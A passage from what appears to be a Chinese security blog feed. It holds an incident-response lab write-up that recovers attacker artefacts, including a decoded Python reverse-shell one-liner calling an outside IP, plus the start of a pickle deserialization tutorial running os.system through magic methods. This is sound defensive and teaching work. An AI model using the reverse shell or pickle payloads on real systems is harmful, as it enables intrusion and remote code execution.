src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009110900133.png" alt="image-20241009110900133"></p><p>这里面home文件十分可疑，我们将该文件导出到我们的主机上，然后使用Windows自带的md5加密进行计算，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009111237829.png" alt="image-20241009111237829"></p><p>故本题的flag为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[84413332e4e7138adc5d6f1f688ddd69]</span><br></pre></td></tr></table></figure><h1 id="分析恶意程序连接地址和密码-格式为-md5-地址-md5-密码-全小写"><a href="#分析恶意程序连接地址和密码-格式为-md5-地址-md5-密码-全小写" class="headerlink" title="分析恶意程序连接地址和密码 格式为:[md5(地址)-md5(密码)]全小写"></a>分析恶意程序连接地址和密码 格式为:[md5(地址)-md5(密码)]全小写</h1><p>对刚才提取出来的home文件我们执行反编译，我们使用pyinstallRE进行逆向分析，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009111541620.png" alt="image-20241009111541620"></p><p>之后再将pyc文件进行在线转py文件即可，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009111642022.png" alt="image-20241009111642022"></p><p>所以连接地址为82.157.238.111，密码为1qaz@WSX3edc，故flag为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[e695461c231aee4ed46b201efca18ff8-7da188c2e2d83e38b7d9e75e500f1af8]</span><br></pre></td></tr></table></figure><h1 id="提交存在反序列化漏洞的端口-格式为-md5-端口"><a href="#提交存在反序列化漏洞的端口-格式为-md5-端口" class="headerlink" title="提交存在反序列化漏洞的端口 格式为:[md5(端口)]"></a>提交存在反序列化漏洞的端口 格式为:[md5(端口)]</h1><p>要找到反序列化漏洞的端口，我们首先登录到我的WAF上去看攻击事件，在筛选框中搜索反序列化，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009141339396.png" alt="image-20241009141339396"></p><p>所以存在反序列化漏洞的端口为8080，所以该题的flag为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[d4a973e303ec37692cc8923e3148eef7]</span><br></pre></td></tr></table></figure><h1 id="提交攻击者使用的后门路由地址-格式为-md5-api-xxx"><a href="#提交攻击者使用的后门路由地址-格式为-md5-api-xxx" class="headerlink" title="提交攻击者使用的后门路由地址 格式为:[md5(/api/xxx)]"></a>提交攻击者使用的后门路由地址 格式为:[md5(/api/xxx)]</h1><p>我们搜索文件上传，我们可以发现攻击者上传了palu-python-flask.tar文件，我们去命令搜索关于这个文件的操作</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/590fb786655b21f535b2576accd753b9.png" alt="590fb786655b21f535b2576accd753b9"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/90cac2b14aa27f0db15ffaa90d5b5221.png" alt="90cac2b14aa27f0db15ffaa90d5b5221"></p><p>我们发现攻击者使用docker载入，我们接着搜索docker命令，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009150417825.png" alt="image-20241009150417825"></p><p>我们可以发现后门可能在flask文件夹下，我们打开对应磁盘，寻找flask文件夹下的内容，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009150612568.png" alt="image-20241009150612568"></p><p>发现已经被删除了，那我们只能一条一条命令去搜索了，最后发现一个cat app.py，就是我们要找的后门文件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/c45a1f30a79170dae3c71d2006073321.png" alt="c45a1f30a79170dae3c71d2006073321"></p><p>所以对应后门地址为<code>/api/system</code>，所以本题flag为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">948c4425bad48511fd6281d345ee69a1</span><br></pre></td></tr></table></figure><h1 id="提交dnslog反弹域名-格式为-md5-域名"><a href="#提交dnslog反弹域名-格式为-md5-域名" class="headerlink" title="提交dnslog反弹域名 格式为:[md5(域名)]"></a>提交dnslog反弹域名 格式为:[md5(域名)]</h1><p>我们发现该后门最后将所有的data数据保存在log.txt中，我们按照上述内存取证的方式将log.txt复制到桌面上，在log.txt里面我们可以发现对应的dnslog反弹域名</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/caa2ab512bfbdf86b1a282c05a3e88e0.png" alt="caa2ab512bfbdf86b1a282c05a3e88e0"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/21bd697414a08d00891cee2548dedae2.png" alt="21bd697414a08d00891cee2548dedae2"></p><p>经过测试，我们可以发现0vqkht.palu.cn是我们的答案，所以本题flag为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">86fedf00e173a0d531be569028fc1f6e</span><br></pre></td></tr></table></figure><h1 id="提交第一次扫描器使用时间-格式为-2024-00-00-00-00-00"><a href="#提交第一次扫描器使用时间-格式为-2024-00-00-00-00-00" class="headerlink" title="提交第一次扫描器使用时间 格式为:[2024/00/00/00:00:00]"></a>提交第一次扫描器使用时间 格式为:[2024/00/00/00:00:00]</h1><p>我们查看log.txt，我们发现这一块时间戳是一致的，且大量进行了ls操作，符合扫描器的特征，我们将unix时间转换为现在的时间即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009151337947.png" alt="image-20241009151337947"></p><p>所以对应的时间为2024-04-15 02:26:59</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2024-04-15 02:26:59]</span><br></pre></td></tr></table></figure><h1 id="提交攻击者反弹shell使用的语言-格式为-md5-c-amp-java-均为小写"><a href="#提交攻击者反弹shell使用的语言-格式为-md5-c-amp-java-均为小写" class="headerlink" title="提交攻击者反弹shell使用的语言 格式为:[md5(c++&amp;java)]均为小写"></a>提交攻击者反弹shell使用的语言 格式为:[md5(c++&amp;java)]均为小写</h1><p>我们查看日志，可以明显的发现反弹shell语句</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009151739238.png" alt="image-20241009151739238"></p><p>所以使用的高级语言是python</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[23eeeb4347bdd26bfc6b7ee9a3b755dd]</span><br></pre></td></tr></table></figure><h1 id="提交攻击者反弹shell的ip-格式为-xxx-xxx-xxx-xxx"><a href="#提交攻击者反弹shell的ip-格式为-xxx-xxx-xxx-xxx" class="headerlink" title="提交攻击者反弹shell的ip 格式为:[xxx.xxx.xxx.xxx]"></a>提交攻击者反弹shell的ip 格式为:[xxx.xxx.xxx.xxx]</h1><p>我们将反弹shell语句进行base64解码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjgyLjE1Ny4yMzguMTc0Iiw3ODkwKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKQ==</span><br></pre></td></tr></table></figure><p>解码如下所示</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="string">&quot;82.157.238.174&quot;</span>,<span class="number">7890</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>);os.dup2(s.fileno(),<span class="number">2</span>);<span class="keyword">import</span> pty; pty.spawn(<span class="string">&quot;sh&quot;</span>)</span><br></pre></td></tr></table></figure><p>所以对应的IP为82.157.238.174，对应端口为7890</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[82.157.238.174]</span><br></pre></td></tr></table></figure><h1 id="提交攻击者留下的账号-格式为-xxxxx"><a href="#提交攻击者留下的账号-格式为-xxxxx" class="headerlink" title="提交攻击者留下的账号 格式为:[xxxxx]"></a>提交攻击者留下的账号 格式为:[xxxxx]</h1><p>直接打开/etc/passwd文件，看里面是否有异常用户</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009152439946.png" alt="image-20241009152439946"></p><p>这里面的异常用户只有palu.com，所以我们判断palu.com即为攻击者留下的账号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[palu.com]</span><br></pre></td></tr></table></figure><h1 id="提交攻击者的后门账户密码-格式为-md5-password"><a href="#提交攻击者的后门账户密码-格式为-md5-password" class="headerlink" title="提交攻击者的后门账户密码 格式为:[md5(password)]"></a>提交攻击者的后门账户密码 格式为:[md5(password)]</h1><p>我们查看shadow文件，shadow是linux存放密码的地方，但是被加密了，我们需要使用json库对其进行解密</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009153035947.png" alt="image-20241009153035947"></p><p>接下来我们使用kali对其进行解密，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009153137598.png" alt="image-20241009153137598"></p><p>所以密码为123123</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[4297f44b13955235245b2497399d7a93]</span><br></pre></td></tr></table></figure><h1 id="提交测试数据条数-格式为-md5-xxx"><a href="#提交测试数据条数-格式为-md5-xxx" class="headerlink" title="提交测试数据条数 格式为[md5(xxx)]"></a>提交测试数据条数 格式为[md5(xxx)]</h1><p>我们直接远程连接数据库服务器，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009155005507.png" alt="image-20241009155005507"></p><p>我们在user表中寻找对应的数据</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009155343955.png" alt="image-20241009155343955"></p><p>我们可以发现有5条测试数据，故本题得flag为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[e4da3b7fbbce2345d7772b0674a318d5]</span><br></pre></td></tr></table></figure><h1 id="请提交攻击者留下的信息-格式为-xxxx"><a href="#请提交攻击者留下的信息-格式为-xxxx" class="headerlink" title="请提交攻击者留下的信息 格式为:[xxxx]"></a>请提交攻击者留下的信息 格式为:[xxxx]</h1><p>我们在堡垒机上输入cat，搜索cat相关内容，发现有一个cat hacktext，我们观看回放即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009161337587.png" alt="image-20241009161337587"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;hi_palu_f10g&#125;</span><br></pre></td></tr></table></figure><h1 id="请提交运维服务器上的恶意文件md5小写32-格式为-xxxx"><a href="#请提交运维服务器上的恶意文件md5小写32-格式为-xxxx" class="headerlink" title="请提交运维服务器上的恶意文件md5小写32 格式为:[xxxx]"></a>请提交运维服务器上的恶意文件md5小写32 格式为:[xxxx]</h1><p>运维服务器我们就在jumpserver上寻找即可，我们搜寻文件上传，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/caf47de5010c82b098eb089b2b7b7603.png" alt="caf47de5010c82b098eb089b2b7b7603"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009162853684.png" alt="image-20241009162853684"></p><p>我们发现这个文件十分可疑，我们试着提交该文件的md5码，发现就是这个文件</p><p>所以flag为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[0fca0f847a45401c878d7a5303ddc1f8]</span><br></pre></td></tr></table></figure><h1 id="提交恶意文件的恶意函数-格式为-md5-恶意函数"><a href="#提交恶意文件的恶意函数-格式为-md5-恶意函数" class="headerlink" title="提交恶意文件的恶意函数 格式为:[md5(恶意函数)]"></a>提交恶意文件的恶意函数 格式为:[md5(恶意函数)]</h1><p>由于恶意文件是二进制文件，所以我们使用IDA进行逆向分析，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009163132232.png" alt="image-20241009163132232"></p><p>我们可疑知道文件中有如图函数，我们经过尝试提交，可疑发现恶意函数为begingame</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ddd0599cda1fc289a617db148d75383b]</span><br></pre></td></tr></table></figure><h1 id="请提交攻击者恶意注册的恶意用户条数-格式为-md5-x"><a href="#请提交攻击者恶意注册的恶意用户条数-格式为-md5-x" class="headerlink" title="请提交攻击者恶意注册的恶意用户条数 格式为:[md5(x)]"></a>请提交攻击者恶意注册的恶意用户条数 格式为:[md5(x)]</h1><p>这里的恶意注册用户即其网页的恶意注册用户，我们访问一下其对应的web服务，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009202415265.png" alt="image-20241009202415265"></p><p>我们可以看到右上角有用户注册功能，所以这里的恶意注册用户应该指的是在该discuz！上恶意注册的用户，我们去对应的数据库下寻找对应的信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009203520314.png" alt="image-20241009203520314"></p><p>所以我们去数据库对应的表上寻找即可，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009203639016.png" alt="image-20241009203639016"></p><p>我们可以发现其中kongzi出现次数很多，为恶意注册，故本题的答案为10</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">d3d9446802a44259755d38e6d163e820</span><br></pre></td></tr></table></figure><h1 id="请提交对博客系统的第一次扫描时间-格式为-2024-00-00-00-00-00"><a href="#请提交对博客系统的第一次扫描时间-格式为-2024-00-00-00-00-00" class="headerlink" title="请提交对博客系统的第一次扫描时间 格式为:[2024/00/00/00:00:00]"></a>请提交对博客系统的第一次扫描时间 格式为:[2024/00/00/00:00:00]</h1><p>我们查看WAF日志，主要寻找对于192.168.20.121的攻击事件，但是我们可以发现所有的攻击事件都是针对192.168.20.123的，当时做到这里的时候我也很疑惑，后来发现192.168.20.123也是discuz！博客系统</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009205010361.png" alt="image-20241009205010361"></p><p>我们发现第一次进行扫描的时间是 2024-04-16 21:03:46</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/aa89a2c97e90896241f38ab1c8fe8431.png" alt="aa89a2c97e90896241f38ab1c8fe8431"></p><p>这题有点奇怪，明明在 2024-04-12 21:38:50也是对80端口进行了目录扫描，不知道为什么这里认定的是4月16号才是第一次扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2024-04-16 21:03:46]</span><br></pre></td></tr></table></figure><h1 id="提交攻击者下载的文件-格式为-xxxx-xxx"><a href="#提交攻击者下载的文件-格式为-xxxx-xxx" class="headerlink" title="提交攻击者下载的文件 格式为[xxxx.xxx]"></a>提交攻击者下载的文件 格式为[xxxx.xxx]</h1><p>我们查看文件传输记录即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/f37af28f7c1a432555b692722170028d.png" alt="f37af28f7c1a432555b692722170028d"></p><p>我觉得是这个文件，但是看了别人的WP，显示的是从论坛上下载的文件，应该是源码泄露了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009211351244.png" alt="image-20241009211351244"></p><p>获取了一个upload.zip，至于为什么是这个答案，我觉得应该是当时的比赛是分区块连贯性的，应该是和前一问有一定的联系，所以会是从web服务上获得的而不是直接从服务器上获得</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[upload.zip]</span><br></pre></td></tr></table></figure><h1 id="请提交攻击者第一次下载的时间-格式为-xx-Apr-2024-xx-xx-xx"><a href="#请提交攻击者第一次下载的时间-格式为-xx-Apr-2024-xx-xx-xx" class="headerlink" title="请提交攻击者第一次下载的时间 格式为:[xx/Apr/2024:xx:xx:xx]"></a>请提交攻击者第一次下载的时间 格式为:[xx/Apr/2024:xx:xx:xx]</h1><p>我们查看对应的访问日志，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009212057405.png" alt="image-20241009212057405"></p><p>我们可以发现最早的时间是16/Apr/2024:09:03:52</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[16/Apr/2024:09:03:52]</span><br></pre></td></tr></table></figure><h1 id="请提交攻击者留下的冰蝎马的文件名称-格式为-xxxx"><a href="#请提交攻击者留下的冰蝎马的文件名称-格式为-xxxx" class="headerlink" title="请提交攻击者留下的冰蝎马的文件名称 格式为:[xxxx]"></a>请提交攻击者留下的冰蝎马的文件名称 格式为:[xxxx]</h1><p>我们将整个网站的文件拷贝下来，放在我们本地用D盾进行扫描即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009212927288.png" alt="image-20241009212927288"></p><p>所以文件名称为nidewen.php</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[nidewen.php]</span><br></pre></td></tr></table></figure><h1 id="提交冰蝎的链接密码-格式为-xxx"><a href="#提交冰蝎的链接密码-格式为-xxx" class="headerlink" title="提交冰蝎的链接密码 格式为:[xxx]"></a>提交冰蝎的链接密码 格式为:[xxx]</h1><p>我们打开文件，即可发现对应的密码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009213139292.png" alt="image-20241009213139292"></p><p>我们拿去md5解密，发现解密为nidewen</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[nidewen]</span><br></pre></td></tr></table></figure><h1 id="提交办公区存在的恶意用户名-格式为-xxx"><a href="#提交办公区存在的恶意用户名-格式为-xxx" class="headerlink" title="提交办公区存在的恶意用户名 格式为:[xxx]"></a>提交办公区存在的恶意用户名 格式为:[xxx]</h1><p>登录PC01，我们发现除了Administrator 用户还有一个hacker用户，所以恶意用户名为hacker</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[hacker]</span><br></pre></td></tr></table></figure><h1 id="提交恶意用户密码到期时间-格式为-xxxx"><a href="#提交恶意用户密码到期时间-格式为-xxxx" class="headerlink" title="提交恶意用户密码到期时间 格式为:[xxxx]"></a>提交恶意用户密码到期时间 格式为:[xxxx]</h1><p>cmd运行net user hacker，可以获取hacker用户相关信息，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241009230029006.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2024/5/28/21:40:37]</span><br></pre></td></tr></table></figure><p>由于我的PC01和PC02靶机都打不开，所以后续涉及Windows的题目都没办法写，所以这里直接跳过吧，确实折腾了很久也没办法，vol始终读不出东西来，可能是磁盘损坏了</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241010174725506.png" alt="image-20241010174725506"></p><h1 id="提交攻击者使用内网扫描工具的哈希-格式为-xxxx"><a href="#提交攻击者使用内网扫描工具的哈希-格式为-xxxx" class="headerlink" title="提交攻击者使用内网扫描工具的哈希 格式为:[xxxx]"></a>提交攻击者使用内网扫描工具的哈希 格式为:[xxxx]</h1><p>最常见的内网扫描工具就是fscan了，我们直接搜索是否有fscan命令的执行即可，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241012093549703.png" alt="image-20241012093549703"></p><p>所以这里的内网扫描工具就是fscan，我们试着去寻找该软件存放位置，并计算md5值，我们通过观看历史命令，可以发现fscan在bin目录中</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241012094442229.png" alt="image-20241012094442229"></p><p>导出到本地计算md5值即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241012094609056.png" alt="image-20241012094609056"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[1facdcd05c43ba4d37274dffc90b6d4e]</span><br></pre></td></tr></table></figure><h1 id="请提交攻击者在站点上留下的后门密码-格式为-xxxx"><a href="#请提交攻击者在站点上留下的后门密码-格式为-xxxx" class="headerlink" title="请提交攻击者在站点上留下的后门密码 格式为:[xxxx]"></a>请提交攻击者在站点上留下的后门密码 格式为:[xxxx]</h1><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241012091004122.png" alt="image-20241012091004122"></p><p>我们可以看到这里的所有攻击事件都是以123作为传参密码的，所以攻击者的后门密码为123</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123</span><br></pre></td></tr></table></figure><h1 id="请提交攻击者在数据库留下的信息-格式为-xxxx"><a href="#请提交攻击者在数据库留下的信息-格式为-xxxx" class="headerlink" title="请提交攻击者在数据库留下的信息 格式为:[xxxx]"></a>请提交攻击者在数据库留下的信息 格式为:[xxxx]</h1><p>我们直接远程连接数据库，在数据库里面查找相关信息</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241012093431554.png" alt="image-20241012093431554"></p><p>经过细致的排查，可以找到隐藏在数据库的flag值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;hack_palu&#125;</span><br></pre></td></tr></table></figure><h1 id="提交攻击者在监控服务器上留下的dcnlog地址-格式为-xxx-xx-xx"><a href="#提交攻击者在监控服务器上留下的dcnlog地址-格式为-xxx-xx-xx" class="headerlink" title="提交攻击者在监控服务器上留下的dcnlog地址 格式为:[xxx.xx.xx]"></a>提交攻击者在监控服务器上留下的dcnlog地址 格式为:[xxx.xx.xx]</h1><p>我们的监控服务器就是zabbix服务器，对应的就是我们的mysql2数据库，我们先试着找一找zabbix服务器的登录账号密码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241012101203742.png" alt="image-20241012101203742"></p><p>我们成功的在数据库里找到了登录的账号密码，但是密码被加密了，因为显示的username是默认用户名，所以我们尝试一下密码是不是默认密码即可，默认密码是zabbix，我们发现可以成功登录，登录进去后我们可以在脚本那一列发现攻击者ping了一个dns地址</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241012104023882.png" alt="image-20241012104023882"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[palu.dcnlog.cn]</span><br></pre></td></tr></table></figure><h1 id="提交监控服务器上恶意用户的上一次登录时间-格式为-xx-xx-xx-xx-xx-xx"><a href="#提交监控服务器上恶意用户的上一次登录时间-格式为-xx-xx-xx-xx-xx-xx" class="headerlink" title="提交监控服务器上恶意用户的上一次登录时间 格式为:[xx/xx/xx/xx:xx:xx]"></a>提交监控服务器上恶意用户的上一次登录时间 格式为:[xx/xx/xx/xx:xx:xx]</h1><p>同样去审计日志，寻找最后一次登录时间</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241012104534534.png" alt="image-20241012104534534"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[2024-04-17 01:32:44]</span><br></pre></td></tr></table></figure><h1 id="提交监控服务器上遗留的反弹shell地址和端口-格式为-xxxx-xx"><a href="#提交监控服务器上遗留的反弹shell地址和端口-格式为-xxxx-xx" class="headerlink" title="提交监控服务器上遗留的反弹shell地址和端口 格式为:[xxxx:xx]"></a>提交监控服务器上遗留的反弹shell地址和端口 格式为:[xxxx:xx]</h1><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241012105200652.png" alt="image-20241012105200652"></p><p>我们在脚本列发现了一串可疑的base64序列，我们拿去解码，结果如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20241012105413100.png" alt="image-20241012105413100"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[154.183.110.12:7890]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> 红蓝对抗 </category>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
            <tag> 蓝队技战法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-通用漏洞-python反序列化及魔术方法</title>
      <link href="/post/b36e5fc4.html"/>
      <url>/post/b36e5fc4.html</url>
      
        <content type="html"><![CDATA[<h1 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h1><p>python反序列化和php反序列化类似，相当于把程序运行时产生的变量，字典，对象等实例变换成字符串的形式存储起来，以便后续调用。</p><p>python中反序列化的库主要有两个，pickle和cPickle，这两个库在运行效率上有区别以外，其他地方没有任何区别，下面将以pickle为例，介绍pickle的常用函数方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>文件格式</span><br><span class="line">pickle.dump(obj,file) <span class="comment">#将对象序列化后保存在文件中</span></span><br><span class="line">pickle.load(file) <span class="comment">#读取文件，将文件中的序列化内容反序列化为对象</span></span><br><span class="line"><span class="number">2.</span>字节流</span><br><span class="line">pickle.dumps(obj) <span class="comment">#将对象序列化成字符串格式的字节流</span></span><br><span class="line">pickle.loads(bytes_obj) <span class="comment">#将字符串格式的字节流反序列化为对象</span></span><br></pre></td></tr></table></figure><p>python反序列化相对于Java反序列化和PHP反序列化都要简单一些，其主要的函数就只有dump和load，且其魔术方法也比较少，一般的pop链不会太长，下面我们介绍python反序列化的魔术方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__reduce__()  <span class="comment">#对象被序列化和反序列化时调用</span></span><br><span class="line">__reduce_ex__() <span class="comment">#对象被序列化和反序列化时调用</span></span><br><span class="line">__setstate__() <span class="comment">#对象被反序列化时调用</span></span><br><span class="line">__getstate__() <span class="comment">#对象被序列化时调用</span></span><br></pre></td></tr></table></figure><h1 id="序列化反序列化实例"><a href="#序列化反序列化实例" class="headerlink" title="序列化反序列化实例"></a>序列化反序列化实例</h1><h2 id="reduce"><a href="#reduce" class="headerlink" title="__reduce__()"></a><code>__reduce__()</code></h2><p>我们首先使用<code>__reduce__()</code>魔术方法进行演示，其中示例代码如下所示</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;反序列化调用&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a) <span class="comment">#序列化操作</span></span><br><span class="line">pickle.loads(p_a)     <span class="comment">#反序列化操作</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br></pre></td></tr></table></figure><p>首先我们运行该代码，看看会出现什么情况。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240920113450289.png" alt="image-20240920113450289"></p><p>我们可以发现<code>calc</code>命令被成功执行，说明<code>__reduce__()</code>函数被成功调用，我们接下来注释掉反序列化操作，看看会有什么情况。</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240920113641420.png" alt="image-20240920113641420"></p><p>我们可以发现啊虽然<code>print</code>函数被成功调用，但是没有调用相关命令，所以<code>__reduce__()</code>函数没有被成功调用，仅仅只是成功进行了序列化操作，至于为什么会执行<code>print</code>而不会执行<code>return</code>，是因为<code>__reduce__()</code>函数是有条件的，需要一个返回值，当我们把return注释掉的时候，会报错，如下所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/593255d6cc8552e5bb3a5b2e0c81d8c3.png" alt="593255d6cc8552e5bb3a5b2e0c81d8c3"></p><h2 id="getstate"><a href="#getstate" class="headerlink" title="__getstate__()"></a><code>__getstate__()</code></h2><p>我们接下来观察<code>__getstate__()</code>魔术方法，相关代码如下所示</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#序列化魔术方法调用-__getstate__</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;序列化调用&#x27;</span>)</span><br><span class="line">        os.system(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br><span class="line"><span class="comment">#序列化时自动调用__getstate__()</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240920135757892.png" alt="image-20240920135757892"></p><p>相关代码仍然可以实现，这是因为<code>__getstate__()</code>函数在被序列化时被调用，所以当我们执行了dumps操作后会直接调用calc命令。</p><h2 id="setstate"><a href="#setstate" class="headerlink" title="__setstate__()"></a><code>__setstate__()</code></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SerializePerson</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">    <span class="comment"># 构造 __setstate__ 方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, name</span>):</span><br><span class="line">        os.system(<span class="string">&#x27;calc&#x27;</span>)  <span class="comment"># 恶意代码</span></span><br><span class="line">tmp = pickle.dumps(SerializePerson(<span class="string">&#x27;tom&#x27;</span>))  <span class="comment">#序列化</span></span><br><span 